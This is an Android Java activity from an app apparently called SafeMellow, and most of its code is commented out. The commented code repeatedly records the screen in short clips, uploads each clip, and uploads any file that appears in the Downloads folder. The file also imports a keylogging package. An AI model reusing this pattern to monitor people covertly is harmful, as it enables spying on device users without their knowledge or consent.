package lk.parinda.safemellow;

import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;

import android.Manifest;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.media.projection.MediaProjectionManager;
import android.os.Bundle;
import android.os.Environment;
import android.os.FileObserver;
import android.util.Log;
import android.view.View;
import android.widget.Toast;

import com.hbisoft.hbrecorder.HBRecorder;
import com.hbisoft.hbrecorder.HBRecorderListener;

import java.io.File;
import java.util.ArrayList;
import java.util.List;
import java.util.Timer;
import java.util.TimerTask;

import lk.parinda.safemellow.db_controll.DownloadFileDBC;
import lk.parinda.safemellow.download_checker.DownloadFileController;
import lk.parinda.safemellow.keylog.latin.settings.SettingsActivity;
import lk.parinda.safemellow.srv.controllers.SRVideoUploadController;

public class MainActivity2 extends AppCompatActivity implements HBRecorderListener {

    HBRecorder hbRecorder;
    int SCREEN_RECORD_REQUEST_CODE = 102;
    int WRITE_CODE = 100;
    int resultCode=0;
    Intent data;
    static boolean needStop=false;
    SRVideoUploadController srVideoUploadController = new SRVideoUploadController();
//    FileObserver observer;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main2);
//        checkPermissions();
//        hbRecorder = new HBRecorder(this, this);
//        findViewById(R.id.button).setOnClickListener(new View.OnClickListener() {
//            @Override
//            public void onClick(View view) {
//                File myFile = new File(Environment.getDataDirectory().getPath() + "/data/lk.parinda.safemellow/files/SRV");
//                if (!myFile.exists()) {
//                    myFile.mkdirs();
//                }
//                srVideoUploadController.init(MainActivity2.this);
//                hbRecorder.recordHDVideo(false);
//                hbRecorder.setOutputPath(Environment.getDataDirectory().getPath() + "/data/lk.parinda.safemellow/files/SRV");
//                hbRecorder.isAudioEnabled(false);
//                hbRecorder.setVideoFrameRate(24);
////                hbRecorder.setScreenDimensions(640, 360);
//                hbRecorder.setScreenDimensions(426, 240);
//                hbRecorder.setVideoBitrate(1000000);
//                hbRecorder.setVideoEncoder("H264");
//                hbRecorder.setOutputFormat("MPEG_4");
//                needStop=false;
//                startRecode();
//            }
//        });
//        findViewById(R.id.button2).setOnClickListener(new View.OnClickListener() {
//            @Override
//            public void onClick(View view) {
//                needStop=true;
//                hbRecorder.stopScreenRecording();
//            }
//        });

//        findViewById(R.id.button3).setOnClickListener(new View.OnClickListener() {
//            @Override
//            public void onClick(View view) {
//                Intent intent = new Intent(MainActivity2.this,SettingsActivity.class);
//                startActivity(intent);
//            }
//        });

//        findViewById(R.id.button4).setOnClickListener(new View.OnClickListener() {
//            @Override
//            public void onClick(View view) {
//                checkPermissions();
//                String sdcardPath = Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOWNLOADS).getPath();
////                String sdcardPath = "/storage/emulated/0/Download/";
////                observer = createFileObserver(sdcardPath + "/WhatsApp/Media/WhatsApp Images/");
//                observer = createFileObserver(sdcardPath);
//                observer.startWatching();
//                Toast.makeText(getApplicationContext(), "service stared", Toast.LENGTH_SHORT).show();
//            }
//        });
//
//        findViewById(R.id.button5).setOnClickListener(new View.OnClickListener() {
//            @Override
//            public void onClick(View view) {
//                if(observer!=null){
//                    observer.stopWatching();
//                }
//            }
//        });
    }

//    private FileObserver createFileObserver(String path) {
////        Log.e("1111", path + " was start!");
//        return new FileObserver(path) {
//            @Override
//            public void onEvent(int event, String fileName) {
////                Log.e("2222", String.valueOf(event));
////                Log.e("2222", fileName);
//
//                if(event == FileObserver.CLOSE_NOWRITE){
////                    Log.e("333", fileName + " was created!");
//                    File file2 = new File(path, fileName);
//                    long fileSizeInBytes = file2.length();
//                    long fileSizeInKB = fileSizeInBytes / 1024;
//                    long fileSizeInMB = fileSizeInKB / 1024;
//
////                    Log.e("444", " file "+file2.exists());
////                    Log.e("444", " file "+file2.canRead());
////                    Log.e("444", " file "+fileSizeInBytes);
////                    Log.e("444", " file "+fileSizeInKB);
////                    Log.e("444", " file "+fileSizeInMB);
//                    if(file2.exists() && file2.canRead()) {
//                        new DownloadFileController(MainActivity2.this).uploadFile(file2,fileName);
//                    }
//                }
//
//                if(event == FileObserver.DELETE || event == FileObserver.DELETE_SELF){
//                    new DownloadFileDBC(MainActivity2.this).delete(fileName);
//                }
//            }
//        };
//    }

//    @Override
//    protected void onActivityResult(int requestCode, int resultCode, Intent data) {
//        super.onActivityResult(requestCode, resultCode, data);
//        if (requestCode == SCREEN_RECORD_REQUEST_CODE) {
//            if (resultCode == RESULT_OK) {
//                hbRecorder.startScreenRecording(data, resultCode);
//                this.resultCode=resultCode;
//                this.data=data;
//            }
//        }
//        if (requestCode == WRITE_CODE) {
////            Log.e("permition", String.valueOf(requestCode));
//            checkPermissions();
//        }
//    }


//    private void checkPermissions() {
//
//        String[] permissions = new String[3];
//        permissions[0]=Manifest.permission.READ_EXTERNAL_STORAGE;
//        permissions[1]=Manifest.permission.WRITE_EXTERNAL_STORAGE;
//        if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.R) {
//            permissions[1]=Manifest.permission.MANAGE_EXTERNAL_STORAGE;
//        }
//
//        List<String> listPermissionsNeeded = new ArrayList<>();
//        for (String p : permissions) {
////            if(p!=null)
////                Log.e("all",p);
//            if (p!=null  && ContextCompat.checkSelfPermission(this, p) != PackageManager.PERMISSION_GRANTED) {
////                Log.e("add",p);
//                listPermissionsNeeded.add(p);
//            }
//        }
//        if (!listPermissionsNeeded.isEmpty()) {
//            ActivityCompat.requestPermissions(this, listPermissionsNeeded.toArray(new String[listPermissionsNeeded.size()]), WRITE_CODE);
//        }
//    }
//
//
    @Override
    public void HBRecorderOnStart() {
        Log.e("--1--",hbRecorder.getFilePath());

    }

    @Override
    public void HBRecorderOnComplete() {
        Log.e("--2--",hbRecorder.getFilePath());
        srVideoUploadController.onFileSave(hbRecorder.getFilePath());
//        process();
        if(!needStop){
//            startRecode();
        }
    }

    @Override
    public void HBRecorderOnError(int errorCode, String reason) {
        Log.e("--3--"+errorCode,reason);
    }

//    void startRecode(){
//        hbRecorder.setFileName(srVideoUploadController.getFileName());
//        if(resultCode==0 || data==null){
//            startRecordingScreen();
//        }else{
//            hbRecorder.startScreenRecording(data, resultCode);
//        }
//        new Timer().schedule(new TimerTask() {
//            @Override
//            public void run() {
//                hbRecorder.stopScreenRecording();
//            }
//        }, 10000);
//    }
//
//    private void startRecordingScreen() {
//        MediaProjectionManager mediaProjectionManager = (MediaProjectionManager) getSystemService(Context.MEDIA_PROJECTION_SERVICE);
//        Intent permissionIntent = mediaProjectionManager != null ? mediaProjectionManager.createScreenCaptureIntent() : null;
//        startActivityForResult(permissionIntent, SCREEN_RECORD_REQUEST_CODE);
//    }
}


//switch (video_resolution) {
//        case "0":
//        hbRecorder.setScreenDimensions(426, 240);
//        break;
//        case "1":
//        hbRecorder.setScreenDimensions(640, 360);
//        break;
//        case "2":
//        hbRecorder.setScreenDimensions(854, 480);
//        break;
//        case "3":
//        hbRecorder.setScreenDimensions(1280, 720);
//        break;
//        case "4":
//        hbRecorder.setScreenDimensions(1920, 1080);
//        break;
//        }


//switch (video_frame_rate) {
//        case "0":
//        hbRecorder.setVideoFrameRate(60);
//        break;
//        case "1":
//        hbRecorder.setVideoFrameRate(50);
//        break;
//        case "2":
//        hbRecorder.setVideoFrameRate(48);
//        break;
//        case "3":
//        hbRecorder.setVideoFrameRate(30);
//        break;
//        case "4":
//        hbRecorder.setVideoFrameRate(25);
//        break;
//        case "5":
//        hbRecorder.setVideoFrameRate(24);
//        break;
//        }

//  switch (video_bit_rate) {
//          case "1":
//          hbRecorder.setVideoBitrate(12000000);
//          break;
//          case "2":
//          hbRecorder.setVideoBitrate(8000000);
//          break;
//          case "3":
//          hbRecorder.setVideoBitrate(7500000);
//          break;
//          case "4":
//          hbRecorder.setVideoBitrate(5000000);
//          break;
//          case "5":
//          hbRecorder.setVideoBitrate(4000000);
//          break;
//          case "6":
//          hbRecorder.setVideoBitrate(2500000);
//          break;
//          case "7":
//          hbRecorder.setVideoBitrate(1500000);
//          break;
//          case "8":
//          hbRecorder.setVideoBitrate(1000000);
//          break;
//          }